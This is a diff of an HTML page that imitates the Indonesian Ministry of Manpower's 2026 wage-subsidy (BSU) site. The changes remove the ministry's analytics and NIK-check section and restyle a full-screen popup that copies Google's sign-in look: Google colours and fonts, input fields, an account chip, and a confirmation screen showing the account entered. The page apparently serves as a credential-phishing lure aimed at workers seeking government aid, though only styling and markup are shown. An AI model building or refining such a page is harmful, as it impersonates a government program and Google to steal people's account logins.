@@ -3,103 +3,337 @@
 
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="robots" content="noindex,nofollow" />
-
-  <title>Bantuan Subsidi Upah</title>
+  <meta name="theme-color" content="#0a2340" />
+  <title>Bantuan Subsidi Upah 2026</title>
 
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet" />
-  <link href="https://fonts.googleapis.com/css2?family=Proza+Libre&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Proza+Libre:wght@600&display=swap" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
 
-  <link rel="stylesheet" href="assets/css/bootstrap.min.css" />
-  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" />
-  <link rel="stylesheet" href="assets/css/style.css" />
-
-  <link rel="icon" href="assets/images/favicon.png" type="image/gif" />
   <style>
-    #pengecekanMandiri {
-      scroll-margin-top: 110px;
-      padding-top: 60px;
-      padding-bottom: 60px;
-      background-color: #f8f9fa;
+    :root {
+      --navy: #0a2340;
+      --navy-2: #12456f;
+      --blue: #1a5fa8;
+      --accent: #2f80d8;
+      --ink: #1b2733;
+      --muted: #5b6b7d;
+      --line: #e2e8f0;
+      --soft: #f4f7fb;
     }
 
-    .bsu-check-notice {
-      max-width: auto;
-      text-align: left;
-    }
+    * { -webkit-tap-highlight-color: transparent; }
 
-    .bsu-check-notice h2 {
-      margin: 0 0 16px;
-      color: #15406a;
-      font-size: 24px;
-      font-weight: 700;
-      line-height: 1.4;
-      letter-spacing: normal;
-    }
+    html { scroll-behavior: smooth; }
 
-    .bsu-check-notice p {
-      margin: 0 0 16px;
+    body {
+      font-family: 'Open Sans', system-ui, -apple-system, sans-serif;
+      color: var(--ink);
+      background: #fff;
+      overflow-x: hidden;
       font-size: 16px;
-      font-weight: 400;
-      line-height: 1.75;
+      line-height: 1.7;
     }
 
-    .bsu-check-notice .privacy-reminder {
-      margin-bottom: 0;
-      padding: 12px 16px;
-      border-left: 3px solid #15406a;
-      background-color: #eaf0f5;
+    h1, h2, h3 { font-family: 'Proza Libre', 'Open Sans', sans-serif; font-weight: 600; line-height: 1.25; }
+
+    body.gsi-lock { overflow: hidden !important; }
+
+    /* ---------- NAVBAR ---------- */
+    .bsu-nav {
+      background: var(--navy);
+      padding: .7rem 0;
+      position: sticky;
+      top: 0;
+      z-index: 1040;
+      box-shadow: 0 1px 0 rgba(255, 255, 255, .08);
     }
 
-    #hasilPengecekan {
-      font-weight: bold;
-      white-space: pre-wrap;
-    }
-
-    .btn-primary {
-      background-color: #007bff;
-      border-color: #007bff;
-    }
-
-    .btn-primary:hover {
-      background-color: #0056b3;
-      border-color: #0056b3;
-    }
-
-    .form-control:focus {
-      border-color: #007bff;
-      box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
-    }
-
-    .spinner-border {
-      display: none;
-      width: 1.5rem;
-      height: 1.5rem;
-      vertical-align: -0.35em;
-    }
-
-    #captchaImageElement {
-      border: 1px solid #ccc;
-      margin-bottom: 5px;
-      cursor: pointer;
-      max-height: 50px;
-      max-width: 100%;
-      object-fit: contain;
-    }
-
-    footer .footer-contacts {
+    .bsu-brand {
       display: flex;
-      flex-wrap: wrap;
-      gap: 12px 32px;
-      padding-top: 0;
+      align-items: center;
+      gap: .65rem;
+      text-decoration: none;
+      color: #fff;
+      min-width: 0;
     }
 
-    body.gsi-lock {
-      overflow: hidden !important;
+    .bsu-brand svg { flex: 0 0 auto; }
+
+    .bsu-brand-txt {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.15;
     }
+
+    .bsu-brand-txt b {
+      font-size: .8rem;
+      letter-spacing: .06em;
+      text-transform: uppercase;
+      font-weight: 700;
+    }
+
+    .bsu-brand-txt span {
+      font-size: .62rem;
+      letter-spacing: .13em;
+      text-transform: uppercase;
+      color: #8fb6dd;
+    }
+
+    .bsu-nav .nav-link {
+      color: #cfdcea;
+      font-size: .875rem;
+      font-weight: 600;
+      padding: .5rem .85rem !important;
+      border-radius: 6px;
+    }
+
+    .bsu-nav .nav-link:hover,
+    .bsu-nav .nav-link:focus { color: #fff; background: rgba(255, 255, 255, .09); }
+
+    .bsu-toggler {
+      border: 1px solid rgba(255, 255, 255, .3);
+      border-radius: 6px;
+      padding: .35rem .55rem;
+      background: none;
+    }
+
+    .bsu-toggler:focus { box-shadow: 0 0 0 3px rgba(47, 128, 216, .45); }
+
+    .bsu-toggler i { color: #fff; font-size: 1.25rem; line-height: 1; display: block; }
+
+    /* ---------- HERO ---------- */
+    .hero {
+      position: relative;
+      background: linear-gradient(140deg, var(--navy) 0%, var(--navy-2) 58%, var(--blue) 100%);
+      color: #fff;
+      padding: clamp(3rem, 9vw, 6.5rem) 0 clamp(2.75rem, 8vw, 5.5rem);
+      overflow: hidden;
+    }
+
+    .hero::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-image:
+        radial-gradient(circle at 82% 18%, rgba(255, 255, 255, .14), transparent 42%),
+        radial-gradient(circle at 12% 88%, rgba(47, 128, 216, .32), transparent 46%);
+      pointer-events: none;
+    }
+
+    .hero > .container { position: relative; z-index: 1; }
+
+    .hero-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: .45rem;
+      background: rgba(255, 255, 255, .12);
+      border: 1px solid rgba(255, 255, 255, .22);
+      color: #dce9f7;
+      font-size: .72rem;
+      font-weight: 700;
+      letter-spacing: .1em;
+      text-transform: uppercase;
+      padding: .38rem .8rem;
+      border-radius: 100px;
+      margin-bottom: 1.25rem;
+    }
+
+    .hero-tag .dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #57d98a;
+      box-shadow: 0 0 0 3px rgba(87, 217, 138, .25);
+    }
+
+    .hero h1 {
+      font-size: clamp(1.75rem, 5.4vw, 3.15rem);
+      margin: 0 0 .85rem;
+      max-width: 19ch;
+    }
+
+    .hero p {
+      font-size: clamp(.95rem, 2.4vw, 1.15rem);
+      color: #c3d7ea;
+      max-width: 46ch;
+      margin: 0 0 1.9rem;
+    }
+
+    .hero-cta { display: flex; flex-wrap: wrap; gap: .7rem; }
+
+    .btn-cta,
+    .btn-ghost {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: .5rem;
+      font-weight: 700;
+      font-size: .92rem;
+      padding: .8rem 1.5rem;
+      border-radius: 8px;
+      text-decoration: none;
+      border: 1px solid transparent;
+      transition: transform .15s ease, background .15s ease;
+    }
+
+    .btn-cta { background: #fff; color: var(--navy); }
+    .btn-cta:hover { background: #e8f0f9; color: var(--navy); transform: translateY(-1px); }
+
+    .btn-ghost { background: rgba(255, 255, 255, .08); color: #fff; border-color: rgba(255, 255, 255, .38); }
+    .btn-ghost:hover { background: rgba(255, 255, 255, .18); color: #fff; }
+
+    /* ---------- NOMINAL ---------- */
+    .stats {
+      background: #fff;
+      border-bottom: 1px solid var(--line);
+      padding: clamp(1.6rem, 4vw, 2.5rem) 0;
+    }
+
+    .stat {
+      background: var(--soft);
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      padding: 1.1rem 1.15rem;
+      height: 100%;
+    }
+
+    .stat b {
+      display: block;
+      font-family: 'Proza Libre', sans-serif;
+      font-size: clamp(1.2rem, 3.4vw, 1.6rem);
+      color: var(--blue);
+      line-height: 1.2;
+      margin-bottom: .15rem;
+    }
+
+    .stat span { font-size: .82rem; color: var(--muted); font-weight: 600; }
+
+    /* ---------- SECTION ---------- */
+    section.blk { padding: clamp(2.6rem, 7vw, 4.5rem) 0; scroll-margin-top: 78px; }
+
+    .blk-alt { background: var(--soft); border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); }
+
+    .eyebrow {
+      display: block;
+      font-size: .72rem;
+      font-weight: 700;
+      letter-spacing: .14em;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin-bottom: .5rem;
+    }
+
+    .blk h2 {
+      font-size: clamp(1.35rem, 4vw, 1.9rem);
+      color: var(--navy);
+      margin: 0 0 .6rem;
+    }
+
+    .blk .lead-txt {
+      color: var(--muted);
+      max-width: 62ch;
+      margin: 0 0 2rem;
+      font-size: .97rem;
+    }
+
+    .req {
+      display: flex;
+      gap: .8rem;
+      background: #fff;
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      padding: 1rem 1.1rem;
+      height: 100%;
+    }
+
+    .req i { color: #188038; font-size: 1.15rem; line-height: 1.35; flex: 0 0 auto; }
+
+    .req p { margin: 0; font-size: .92rem; line-height: 1.65; color: #33414f; }
+
+    .note {
+      display: flex;
+      gap: .8rem;
+      margin-top: 1.75rem;
+      padding: 1rem 1.15rem;
+      background: #fff7e6;
+      border: 1px solid #f2dcae;
+      border-left: 3px solid #d9a013;
+      border-radius: 8px;
+      font-size: .875rem;
+      color: #6b5217;
+      line-height: 1.65;
+    }
+
+    .note i { color: #b8860b; font-size: 1.1rem; flex: 0 0 auto; line-height: 1.4; }
+
+    .note a { color: #8a6508; font-weight: 700; }
+
+    /* ---------- STEPS ---------- */
+    .step {
+      display: flex;
+      gap: 1rem;
+      background: #fff;
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      padding: 1.1rem 1.15rem;
+      height: 100%;
+    }
+
+    .step-num {
+      flex: 0 0 auto;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: var(--blue);
+      color: #fff;
+      font-weight: 700;
+      font-size: .9rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .step h3 { font-size: .98rem; margin: 0 0 .2rem; color: var(--navy); }
+
+    .step p { margin: 0; font-size: .875rem; color: var(--muted); }
+
+    .step a { color: var(--accent); font-weight: 700; text-decoration: none; word-break: break-word; }
+    .step a:hover { text-decoration: underline; }
+
+    .infobox {
+      background: #fff;
+      border: 1px solid var(--line);
+      border-left: 4px solid var(--blue);
+      border-radius: 10px;
+      padding: 1.25rem 1.35rem;
+    }
+
+    .infobox h3 { font-size: 1.02rem; color: var(--navy); margin: 0 0 .6rem; letter-spacing: .01em; }
+
+    .infobox p { margin: 0 0 .8rem; font-size: .92rem; color: #3c4a58; }
+
+    .infobox p:last-child { margin-bottom: 0; }
+
+    /* ---------- FOOTER ---------- */
+    .bsu-foot {
+      background: var(--navy);
+      color: #9db4ca;
+      padding: 2.5rem 0 1.75rem;
+      font-size: .85rem;
+    }
+
+    .bsu-foot .foot-brand { display: flex; align-items: center; gap: .65rem; margin-bottom: .9rem; color: #fff; }
+
+    .bsu-foot .foot-brand b { font-size: .8rem; letter-spacing: .06em; text-transform: uppercase; }
+
+    .bsu-foot p { margin: 0 0 .5rem; max-width: 40ch; line-height: 1.7; }
+
+    .bsu-foot .copy { border-top: 1px solid rgba(255, 255, 255, .12); margin-top: 1.5rem; padding-top: 1.1rem; font-size: .78rem; color: #7f98b0; }
 
     /* ================= POPUP ================= */
     #gsi-root {
@@ -118,32 +352,13 @@
       transition: opacity .25s ease;
     }
 
-    #gsi-root.gsi-hide {
-      opacity: 0;
-      pointer-events: none;
-    }
+    #gsi-root.gsi-hide { opacity: 0; pointer-events: none; }
 
-    #gsi-root *,
-    #gsi-root *::before,
-    #gsi-root *::after {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    #gsi-root *, #gsi-root *::before, #gsi-root *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-    #gsi-root input,
-    #gsi-root button,
-    #gsi-root select {
-      font-family: inherit;
-    }
+    #gsi-root input, #gsi-root button, #gsi-root select { font-family: inherit; }
 
-    #gsi-root .gsi-main {
-      flex: 1 0 auto;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 24px 16px;
-    }
+    #gsi-root .gsi-main { flex: 1 0 auto; display: flex; align-items: center; justify-content: center; padding: 24px 16px; }
 
     #gsi-root .gsi-card {
       width: 100%;
@@ -153,36 +368,17 @@
       border-radius: 8px;
       padding: 48px 40px 36px;
       text-align: center;
+      box-shadow: 0 1px 3px rgba(60, 64, 67, .12), 0 6px 24px rgba(60, 64, 67, .09);
       animation: gsiIn .3s ease;
     }
 
-    @keyframes gsiIn {
-      from { opacity: 0; transform: translateY(12px); }
-      to { opacity: 1; transform: none; }
-    }
+    @keyframes gsiIn { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: none; } }
 
-    #gsi-root .gsi-logo {
-      display: block;
-      width: 48px;
-      height: 48px;
-      margin: 0 auto 16px;
-    }
+    #gsi-root .gsi-logo { display: block; width: 48px; height: 48px; margin: 0 auto 16px; }
 
-    #gsi-root h1 {
-      font-size: 24px;
-      font-weight: 400;
-      line-height: 1.33;
-      color: #202124;
-      margin: 0 0 8px;
-    }
+    #gsi-root h1 { font-size: 24px; font-weight: 400; line-height: 1.33; color: #202124; margin: 0 0 8px; }
 
-    #gsi-root .gsi-sub {
-      font-size: 16px;
-      font-weight: 400;
-      line-height: 1.5;
-      color: #202124;
-      margin: 0 0 32px;
-    }
+    #gsi-root .gsi-sub { font-size: 15px; font-weight: 400; line-height: 1.5; color: #5f6368; margin: 0 0 30px; }
 
     #gsi-root .gsi-chip {
       display: none;
@@ -201,521 +397,300 @@
     }
 
     #gsi-root .gsi-chip .gsi-av {
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
-      background: #1a73e8;
-      color: #fff;
-      font-size: 12px;
-      font-weight: 500;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-transform: uppercase;
+      width: 24px; height: 24px; border-radius: 50%; background: #1a73e8; color: #fff;
+      font-size: 12px; font-weight: 500; display: flex; align-items: center;
+      justify-content: center; text-transform: uppercase;
     }
 
-    #gsi-root .gsi-field {
-      position: relative;
-      text-align: left;
-      margin-bottom: 6px;
-    }
+    #gsi-root .gsi-field { position: relative; text-align: left; margin-bottom: 6px; }
 
     #gsi-root .gsi-field input {
-      width: 100%;
-      height: 56px;
-      padding: 13px 15px;
-      font-size: 16px;
-      line-height: 1.5;
-      color: #202124;
-      background: transparent;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      outline: none;
+      width: 100%; height: 56px; padding: 13px 15px; font-size: 16px; line-height: 1.5;
+      color: #202124; background: transparent; border: 1px solid #dadce0; border-radius: 4px; outline: none;
     }
 
-    #gsi-root .gsi-field input:focus {
-      border: 2px solid #1a73e8;
-      padding: 12px 14px;
-    }
+    #gsi-root .gsi-field input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
 
     #gsi-root .gsi-field label {
-      position: absolute;
-      left: 12px;
-      top: 16px;
-      padding: 0 4px;
-      font-size: 16px;
-      color: #5f6368;
-      background: #fff;
-      pointer-events: none;
+      position: absolute; left: 12px; top: 16px; padding: 0 4px; font-size: 16px; color: #5f6368;
+      background: #fff; pointer-events: none;
       transition: top .15s cubic-bezier(.4, 0, .2, 1), font-size .15s cubic-bezier(.4, 0, .2, 1);
     }
 
-    #gsi-root .gsi-field input:focus+label,
-    #gsi-root .gsi-field input:not(:placeholder-shown)+label {
-      top: -8px;
-      font-size: 12px;
-    }
+    #gsi-root .gsi-field input:focus + label,
+    #gsi-root .gsi-field input:not(:placeholder-shown) + label { top: -8px; font-size: 12px; }
 
-    #gsi-root .gsi-field input:focus+label {
-      color: #1a73e8;
-    }
+    #gsi-root .gsi-field input:focus + label { color: #1a73e8; }
 
-    #gsi-root .gsi-field.gsi-bad input {
-      border: 2px solid #d93025;
-      padding: 12px 14px;
-    }
-
-    #gsi-root .gsi-field.gsi-bad label {
-      color: #d93025;
-    }
+    #gsi-root .gsi-field.gsi-bad input { border: 2px solid #d93025; padding: 12px 14px; }
+    #gsi-root .gsi-field.gsi-bad label { color: #d93025; }
 
     #gsi-root .gsi-err {
-      display: none;
-      align-items: flex-start;
-      gap: 6px;
-      font-size: 12px;
-      line-height: 1.33;
-      color: #d93025;
-      text-align: left;
-      margin: 4px 0 0;
+      display: none; align-items: flex-start; gap: 6px; font-size: 12px; line-height: 1.33;
+      color: #d93025; text-align: left; margin: 4px 0 0;
     }
 
-    #gsi-root .gsi-err.show {
-      display: flex;
-    }
-
-    #gsi-root .gsi-err svg {
-      flex: 0 0 auto;
-      margin-top: 1px;
-    }
+    #gsi-root .gsi-err.show { display: flex; }
+    #gsi-root .gsi-err svg { flex: 0 0 auto; margin-top: 1px; }
 
     #gsi-root .gsi-link {
-      display: inline-block;
-      margin: 12px 0 0;
-      font-size: 14px;
-      font-weight: 500;
-      color: #1a73e8;
-      text-decoration: none;
-      cursor: pointer;
-      border-radius: 4px;
+      display: inline-block; margin: 12px 0 0; font-size: 14px; font-weight: 500;
+      color: #1a73e8; text-decoration: none; cursor: pointer; border-radius: 4px;
     }
 
-    #gsi-root .gsi-link:hover {
-      text-decoration: underline;
-    }
+    #gsi-root .gsi-link:hover { text-decoration: underline; }
 
-    #gsi-root .gsi-guest {
-      font-size: 14px;
-      line-height: 1.5;
-      color: #5f6368;
-      text-align: left;
-      margin: 36px 0 0;
-    }
-
-    #gsi-root .gsi-guest a {
-      color: #1a73e8;
-      font-weight: 500;
-      text-decoration: none;
-    }
-
-    #gsi-root .gsi-guest a:hover {
-      text-decoration: underline;
-    }
+    #gsi-root .gsi-guest { font-size: 13.5px; line-height: 1.55; color: #5f6368; text-align: left; margin: 34px 0 0; }
+    #gsi-root .gsi-guest a { color: #1a73e8; font-weight: 500; text-decoration: none; }
+    #gsi-root .gsi-guest a:hover { text-decoration: underline; }
 
     #gsi-root .gsi-check {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 14px;
-      color: #202124;
-      text-align: left;
-      margin: 18px 0 0;
-      cursor: pointer;
+      display: flex; align-items: center; gap: 10px; font-size: 14px; color: #202124;
+      text-align: left; margin: 18px 0 0; cursor: pointer;
     }
 
-    #gsi-root .gsi-check input {
-      width: 18px;
-      height: 18px;
-      accent-color: #1a73e8;
-      cursor: pointer;
-    }
+    #gsi-root .gsi-check input { width: 18px; height: 18px; accent-color: #1a73e8; cursor: pointer; }
 
     #gsi-root .gsi-row {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 12px;
-      margin-top: 36px;
-      flex-wrap: wrap;
+      display: flex; align-items: center; justify-content: space-between; gap: 12px;
+      margin-top: 34px; flex-wrap: wrap;
     }
 
-    #gsi-root .gsi-row-end {
-      display: flex;
-      align-items: center;
-      justify-content: flex-end;
-      gap: 12px;
-      margin-top: 36px;
-    }
+    #gsi-root .gsi-row-end { display: flex; align-items: center; justify-content: flex-end; gap: 12px; margin-top: 34px; }
 
     #gsi-root .gsi-btn {
-      background: #1a73e8;
-      color: #fff;
-      border: 0;
-      border-radius: 4px;
-      height: 36px;
-      padding: 0 24px;
-      min-width: 88px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
+      background: #1a73e8; color: #fff; border: 0; border-radius: 4px; height: 38px;
+      padding: 0 24px; min-width: 90px; font-size: 14px; font-weight: 500; cursor: pointer;
+      display: inline-flex; align-items: center; justify-content: center; gap: 8px;
     }
 
-    #gsi-root .gsi-btn:hover {
-      background: #1b66c9;
-      box-shadow: 0 1px 2px rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15);
-    }
-
-    #gsi-root .gsi-btn:disabled {
-      opacity: .75;
-      cursor: default;
-      box-shadow: none;
-    }
+    #gsi-root .gsi-btn:hover { background: #1b66c9; box-shadow: 0 1px 2px rgba(60, 64, 67, .3), 0 1px 3px 1px rgba(60, 64, 67, .15); }
+    #gsi-root .gsi-btn:disabled { opacity: .75; cursor: default; box-shadow: none; }
 
     #gsi-root .gsi-btn-text {
-      background: none;
-      border: 0;
-      height: 36px;
-      padding: 0 8px;
-      border-radius: 4px;
-      color: #1a73e8;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
+      background: none; border: 0; height: 38px; padding: 0 8px; border-radius: 4px;
+      color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer;
     }
 
-    #gsi-root .gsi-btn-text:hover {
-      background: rgba(26, 115, 232, .05);
-    }
+    #gsi-root .gsi-btn-text:hover { background: rgba(26, 115, 232, .05); }
 
     #gsi-root .gsi-spin {
-      width: 14px;
-      height: 14px;
-      border: 2px solid rgba(255, 255, 255, .45);
-      border-top-color: #fff;
-      border-radius: 50%;
-      animation: gsiSp .7s linear infinite;
-      display: none;
+      width: 14px; height: 14px; border: 2px solid rgba(255, 255, 255, .45);
+      border-top-color: #fff; border-radius: 50%; animation: gsiSp .7s linear infinite; display: none;
     }
 
-    #gsi-root .gsi-btn.gsi-loading .gsi-spin {
-      display: block;
-    }
+    #gsi-root .gsi-btn.gsi-loading .gsi-spin { display: block; }
 
-    @keyframes gsiSp {
-      to { transform: rotate(360deg); }
-    }
+    @keyframes gsiSp { to { transform: rotate(360deg); } }
 
     #gsi-root .gsi-foot {
-      flex: 0 0 auto;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 16px;
-      padding: 12px 24px;
-      font-size: 12px;
-      color: #5f6368;
-      flex-wrap: wrap;
+      flex: 0 0 auto; display: flex; align-items: center; justify-content: space-between;
+      gap: 16px; padding: 12px 24px; font-size: 12px; color: #5f6368; flex-wrap: wrap;
     }
 
-    #gsi-root .gsi-foot .gsi-note {
-      font-size: 11px;
-      color: #80868b;
-    }
+    #gsi-root .gsi-foot .gsi-note { font-size: 11px; color: #80868b; }
+    #gsi-root .gsi-foot select { border: 0; background: transparent; font-size: 12px; color: #5f6368; padding: 4px; cursor: pointer; }
+    #gsi-root .gsi-foot nav { display: flex; gap: 20px; }
+    #gsi-root .gsi-foot nav a { color: #5f6368; text-decoration: none; }
+    #gsi-root .gsi-foot nav a:hover { color: #202124; }
 
-    #gsi-root .gsi-foot select {
-      border: 0;
-      background: transparent;
-      font-size: 12px;
-      color: #5f6368;
-      padding: 4px;
-      cursor: pointer;
-    }
-
-    #gsi-root .gsi-foot nav {
-      display: flex;
-      gap: 20px;
-    }
-
-    #gsi-root .gsi-foot nav a {
-      color: #5f6368;
-      text-decoration: none;
-    }
-
-    #gsi-root .gsi-foot nav a:hover {
-      color: #202124;
-    }
-
-    #gsi-root .gsi-done {
-      display: none;
-      text-align: center;
-      padding: 8px 0 24px;
-    }
+    #gsi-root .gsi-done { display: none; text-align: center; padding: 8px 0 24px; }
 
     #gsi-root .gsi-done .gsi-ok {
-      width: 64px;
-      height: 64px;
-      border-radius: 50%;
-      background: #e6f4ea;
-      margin: 0 auto 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      width: 64px; height: 64px; border-radius: 50%; background: #e6f4ea; margin: 0 auto 20px;
+      display: flex; align-items: center; justify-content: center;
     }
 
-    #gsi-root .gsi-done h2 {
-      font-size: 22px;
-      font-weight: 400;
-      margin: 0 0 10px;
-    }
+    #gsi-root .gsi-done h2 { font-size: 22px; font-weight: 400; margin: 0 0 10px; }
+    #gsi-root .gsi-done p { font-size: 14px; color: #5f6368; line-height: 1.6; }
+    #gsi-root .gsi-done .gsi-who { font-weight: 500; color: #202124; word-break: break-all; }
 
-    #gsi-root .gsi-done p {
-      font-size: 14px;
-      color: #5f6368;
-      line-height: 1.6;
-    }
-
-    #gsi-root .gsi-done .gsi-who {
-      font-weight: 500;
-      color: #202124;
-      word-break: break-all;
-    }
-
-    @media(max-width:520px) {
-      #gsi-root .gsi-main {
-        padding: 0;
-        align-items: flex-start;
-      }
-
+    @media (max-width: 520px) {
+      #gsi-root .gsi-main { padding: 0; align-items: flex-start; }
       #gsi-root .gsi-card {
-        border: 0;
-        border-radius: 0;
-        padding: 24px 24px 32px;
-        max-width: 100%;
+        border: 0; border-radius: 0; box-shadow: none;
+        padding: 22px 22px 30px; max-width: 100%;
       }
+      #gsi-root .gsi-foot { padding: 12px 22px; }
+    }
 
-      #gsi-root .gsi-foot {
-        padding: 12px 24px;
-      }
+    @media (min-width: 992px) {
+      #gsi-root { background: #f1f3f4; }
     }
 
     #gsiReopen {
-      position: fixed;
-      right: 18px;
-      bottom: 18px;
-      z-index: 2147482999;
-      display: none;
-      align-items: center;
-      gap: 8px;
-      height: 44px;
-      padding: 0 20px;
-      border: 0;
-      border-radius: 22px;
-      background: #1a73e8;
-      color: #fff;
-      font: 500 14px/1 Roboto, Arial, sans-serif;
-      box-shadow: 0 4px 14px rgba(0, 0, 0, .25);
-      cursor: pointer;
+      position: fixed; right: 16px; bottom: 16px; z-index: 2147482999; display: none;
+      align-items: center; gap: 8px; height: 44px; padding: 0 20px; border: 0; border-radius: 22px;
+      background: #1a73e8; color: #fff; font: 500 14px/1 Roboto, Arial, sans-serif;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, .28); cursor: pointer;
     }
 
-    #gsiReopen:hover {
-      background: #1b66c9;
-    }
+    #gsiReopen:hover { background: #1b66c9; }
   </style>
-  <script defer data-domain="bsu.kemnaker.go.id" src="https://plausible.kemnaker.go.id/js/script.js"></script>
 </head>
 
-<body id="page-top">
-  <nav class="navbar navbar-expand-lg navbar-dark fixed-top alt animated navbar-custom">
+<body>
+
+  <nav class="bsu-nav">
     <div class="container">
-      <a class="navbar-brand" href="#">
-        <img src="assets/images/logo-blue.png" alt="Logo Kementrian Ketenagakerjaan" width="160" height="60" style="object-fit: contain;" />
-      </a>
+      <div class="d-flex align-items-center justify-content-between">
+        <a class="bsu-brand" href="#home">
+          <svg width="34" height="34" viewBox="0 0 48 48" aria-hidden="true">
+            <path d="M24 3 42 9v14c0 11-7.6 18.9-18 22C13.6 41.9 6 34 6 23V9L24 3Z" fill="none" stroke="#fff" stroke-width="2.4" stroke-linejoin="round"/>
+            <circle cx="24" cy="22" r="6.2" fill="none" stroke="#fff" stroke-width="2.2"/>
+            <path d="M24 12.6v3M24 28.4v3M14.6 22h3M30.4 22h3" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
+          </svg>
+          <span class="bsu-brand-txt">
+            <b>Bantuan Subsidi Upah</b>
+            <span>Kementerian Ketenagakerjaan RI</span>
+          </span>
+        </a>
 
-      <button class="navbar-toggler material-ripple" type="button" data-toggle="collapse"
-        data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false"
-        aria-label="Toggle navigation">
-        <span class="icon-bar i1"></span>
-        <span class="icon-bar i2"></span>
-        <span class="icon-bar i3"></span>
-      </button>
+        <button class="bsu-toggler d-lg-none" type="button" data-bs-toggle="collapse" data-bs-target="#bsuMenu"
+          aria-controls="bsuMenu" aria-expanded="false" aria-label="Buka menu">
+          <i class="bi bi-list"></i>
+        </button>
 
-      <div class="collapse navbar-collapse" id="navbarNavDropdown">
-        <ul class="navbar-nav ml-auto">
-          <li class="nav-item">
-            <a class="nav-link active" href="#home">Beranda<span class="sr-only">(current)</span></a>
-          </li>
-          <li class="nav-item">
-            <a class="nav-link" href="#syarat">Syarat</a>
-          </li>
-          <li class="nav-item">
-            <a class="nav-link" href="#pengecekan">Pengecekan Resmi</a>
-          </li>
-          <li class="nav-item">
-            <a class="nav-link" href="#pengecekanMandiri">Cek NIK</a>
-          </li>
-          <li class="nav-item">
-            <a class="nav-link" href="https://bantuan.kemnaker.go.id/" target="_blank">Pusat Bantuan</a>
-          </li>
-        </ul>
+        <div class="collapse d-lg-block" id="bsuMenu">
+          <ul class="nav flex-column flex-lg-row gap-lg-1 mt-3 mt-lg-0 pb-2 pb-lg-0">
+            <li class="nav-item"><a class="nav-link" href="#home">Beranda</a></li>
+            <li class="nav-item"><a class="nav-link" href="#syarat">Syarat</a></li>
+            <li class="nav-item"><a class="nav-link" href="#pengecekan">Cara Cek</a></li>
+            <li class="nav-item"><a class="nav-link" href="https://bantuan.kemnaker.go.id/" target="_blank" rel="noopener">Pusat Bantuan</a></li>
+          </ul>
+        </div>
       </div>
     </div>
   </nav>
 
-  <header id="home">
-    <div class="hero-section">
-      <div class="container">
-        <div class="row">
-          <div class="col-lg-12">
-            <div class="hero-text" style="margin-top: 280px;">
-              <h1>Bantuan Subsidi Upah 2026</h1>
-              <p>
-                Dukungan Pemerintah untuk Pekerja/Buruh Indonesia
-              </p>
-            </div>
-          </div>
-        </div>
+  <header class="hero" id="home">
+    <div class="container">
+      <span class="hero-tag"><span class="dot"></span> Program Pemerintah 2026</span>
+      <h1>Bantuan Subsidi Upah 2026</h1>
+      <p>Dukungan Pemerintah untuk Pekerja/Buruh Indonesia dalam menjaga daya beli dan ketahanan ekonomi keluarga.</p>
+      <div class="hero-cta">
+        <a href="#pengecekan" class="btn-cta"><i class="bi bi-search"></i> Cara Pengecekan</a>
+        <a href="#syarat" class="btn-ghost"><i class="bi bi-list-check"></i> Syarat Penerima</a>
       </div>
     </div>
   </header>
 
-  <section id="content1">
+  <div class="stats">
     <div class="container">
-      <div class="section-content">
-        <p style="text-align: justify;">
-          Pemerintah kembali menghadirkan Bantuan Subsidi Upah (BSU) 2026 sebagai bentuk dukungan untuk mempertahankan daya beli dan menjaga ketahanan ekonomi pekerja/buruh.
-        </p>
-        <p style="text-align: justify;">
-          Program Bantuan Pemerintah berupa subsidi gaji/upah dalam bentuk uang tunai sebesar Rp300.000,- per bulan selama 3 bulan,
-          <strong style="font-weight: bold;">yang dibayarkan sekaligus dengan total Rp900.000,-.</strong>
-        </p>
+      <div class="row g-3">
